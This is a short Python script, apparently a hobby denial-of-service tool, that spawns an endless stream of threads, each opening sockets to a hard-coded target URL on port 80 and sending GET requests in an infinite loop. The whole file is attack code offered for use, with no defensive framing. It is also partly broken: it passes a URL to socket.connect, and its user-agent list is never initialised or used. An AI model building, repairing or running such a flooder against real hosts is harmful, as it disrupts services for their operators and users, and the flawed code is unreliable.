#@author Shreeniket Bendre

import socket
import threading
import random
import sys, errno



#Comment first target def for custom url, comment second for local host
# target = socket.gethostbyname(socket.gethostname()) 
target = "http://10.30.40.181/gv_shout/"
ip = 'localhost' #change to mask id 
port = 80
print("http://151.30.04.1/")
print("Started Successfully")

def useragent_list():
	global headers_useragents
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	return(headers_useragents)

def attack():
  while 0<1:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((target, port))
      s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
      s.sendto(("Host: " + ip + "\r\n\r\n").encode('ascii'), (target, port))
      
      s.close()
    # except IOError as e:
    #   if e.errno == errno.EPIPE:
	   #    pass

i = 0
while (i<2000):
    thread = threading.Thread(target=attack)
    thread.start()
    i+=1
    if (i > 1950):
      i = 0
